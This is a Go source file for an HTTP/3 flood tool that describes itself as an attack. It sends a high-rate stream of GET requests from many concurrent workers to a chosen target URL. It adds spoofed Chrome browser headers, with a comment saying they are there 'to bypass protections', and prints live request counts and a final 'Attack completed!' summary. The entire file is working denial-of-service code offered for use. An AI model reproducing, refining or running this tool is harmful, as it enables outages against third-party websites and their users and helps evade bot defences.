package main

import (
    "flag"
    "fmt"
    "net/http"
    "os"
    "sync"
    "sync/atomic"
    "time"

    "github.com/quic-go/quic-go/http3"
)

var (
    requestCount uint64
    errorCount   uint64
)

func main() {
    // Parse command-line arguments
    var target string
    var duration int
    var rate int
    var threads int

    flag.StringVar(&target, "target", "", "Target URL to flood")
    flag.IntVar(&duration, "time", 60, "Duration in seconds")
    flag.IntVar(&rate, "rate", 100, "Requests per second per thread")
    flag.IntVar(&threads, "thread", 10, "Number of concurrent threads")
    flag.Parse()

    if target == "" {
        fmt.Println("Usage: ./http3 -target <URL> [-time <seconds>] [-rate <req/sec>] [-thread <count>]")
        fmt.Println("Example: ./http3 -target https://example.com -time 60 -rate 100 -thread 10")
        os.Exit(1)
    }

    fmt.Printf("Starting HTTP/3 flood attack:\n")
    fmt.Printf("Target: %s\n", target)
    fmt.Printf("Duration: %d seconds\n", duration)
    fmt.Printf("Rate: %d req/sec per thread\n", rate)
    fmt.Printf("Threads: %d\n", threads)
    fmt.Printf("Total expected rate: %d req/sec\n\n", rate*threads)

    // Create wait group for threads
    var wg sync.WaitGroup
    stopChan := make(chan struct{})

    // Start monitoring goroutine
    go monitor(stopChan)

    // Start worker threads
    for i := 0; i < threads; i++ {
        wg.Add(1)
        go worker(i, target, rate, stopChan, &wg)
    }

    // Run for specified duration
    time.Sleep(time.Duration(duration) * time.Second)
    
    // Signal all workers to stop
    close(stopChan)
    
    // Wait for all workers to finish
    wg.Wait()

    // Print final statistics
    fmt.Printf("\n\nAttack completed!\n")
    fmt.Printf("Total requests sent: %d\n", atomic.LoadUint64(&requestCount))
    fmt.Printf("Total errors: %d\n", atomic.LoadUint64(&errorCount))
    fmt.Printf("Success rate: %.2f%%\n", float64(atomic.LoadUint64(&requestCount)-atomic.LoadUint64(&errorCount))/float64(atomic.LoadUint64(&requestCount))*100)
}

func worker(id int, target string, rate int, stopChan chan struct{}, wg *sync.WaitGroup) {
    defer wg.Done()

    // Create HTTP/3 client with connection reuse
    client := &http.Client{
        Transport: &http3.RoundTripper{
            DisableCompression: true,
        },
        Timeout: 10 * time.Second,
    }

    // Calculate delay between requests
    delay := time.Second / time.Duration(rate)
    ticker := time.NewTicker(delay)
    defer ticker.Stop()

    for {
        select {
        case <-stopChan:
            return
        case <-ticker.C:
            go sendRequest(client, target)
        }
    }
}

func sendRequest(client *http.Client, target string) {
    req, err := http.NewRequest("GET", target, nil)
    if err != nil {
        atomic.AddUint64(&errorCount, 1)
        return
    }

    // Add real browser headers to bypass protections
    req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
    req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
    req.Header.Set("Accept-Language", "en-US,en;q=0.9")
    req.Header.Set("Accept-Encoding", "gzip, deflate, br")
    req.Header.Set("Cache-Control", "no-cache")
    req.Header.Set("Pragma", "no-cache")
    req.Header.Set("Sec-Ch-Ua", "\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"120\", \"Google Chrome\";v=\"120\"")
    req.Header.Set("Sec-Ch-Ua-Mobile", "?0")
    req.Header.Set("Sec-Ch-Ua-Platform", "\"Windows\"")
    req.Header.Set("Sec-Fetch-Dest", "document")
    req.Header.Set("Sec-Fetch-Mode", "navigate")
    req.Header.Set("Sec-Fetch-Site", "none")
    req.Header.Set("Sec-Fetch-User", "?1")
    req.Header.Set("Upgrade-Insecure-Requests", "1")

    resp, err := client.Do(req)
    atomic.AddUint64(&requestCount, 1)
    
    if err != nil {
        atomic.AddUint64(&errorCount, 1)
        return
    }
    
    // Close response body immediately to free resources
    resp.Body.Close()
}

func monitor(stopChan chan struct{}) {
    ticker := time.NewTicker(1 * time.Second)
    defer ticker.Stop()

    var lastCount uint64
    
    for {
        select {
        case <-stopChan:
            return
        case <-ticker.C:
            currentCount := atomic.LoadUint64(&requestCount)
            currentErrors := atomic.LoadUint64(&errorCount)
            rate := currentCount - lastCount
            lastCount = currentCount
            
            fmt.Printf("\rRequests: %d | Errors: %d | Rate: %d req/s", 
                currentCount, currentErrors, rate)
        }
    }
}

